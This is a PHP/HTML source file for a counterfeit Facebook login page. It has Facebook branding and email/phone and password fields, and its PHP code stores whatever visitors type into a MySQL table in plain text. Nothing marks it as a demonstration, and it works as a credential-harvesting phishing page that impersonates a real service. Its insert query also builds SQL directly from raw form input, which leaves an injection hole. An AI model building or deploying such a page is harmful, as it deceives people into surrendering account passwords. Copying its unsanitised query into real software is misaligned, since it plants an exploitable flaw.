<!DOCTYPE html>
<html lang="en">
  <head>
      <?php include'style2.css'   ?>
        <?php include'links2.php'   ?>
    
  </head>
  <body>
      <div >
    <div class="container flex">
      <div class="facebook-page flex">
        <div class="text">
          <h1>facebook</h1>
          <p>Connect with friends and the world </p>
          <p> around you on Facebook.</p>
        </div>
        <form action="" method="POST">
          <input type="string" name="no" placeholder="Email or phone number" required>
          <input type="password" name="ps" placeholder="Password" required>
          <div class="link">
            <button type="submit" name="submit" class="login">Login</button>
            <a href="#" class="forgot">Forgot password?</a>
          </div>
          <hr>
          <div class="button">
            <a href="#">Create new account</a>
          </div>
        </form>
      </div>
    </div>
      </div>
          
  </body>
</html>

      
      <?php
    include'connection2.php';
      
      if(isset($_POST['submit'])){
          $name=$_POST['no'];
          $pas=$_POST['ps'];
          
          $query="INSERT INTO web(name,pasword) values('$name','$pas')";
          
          $resu=mysqli_query($con,$query);
          
          if($resu){
              ?>
<script>
alert("data inserted");
</script>
<?php
          }
          else{
              ?>
              <script>
                  alert("data not inserted");
              </script>
                  <?php
          }
      }
      ?>
      
    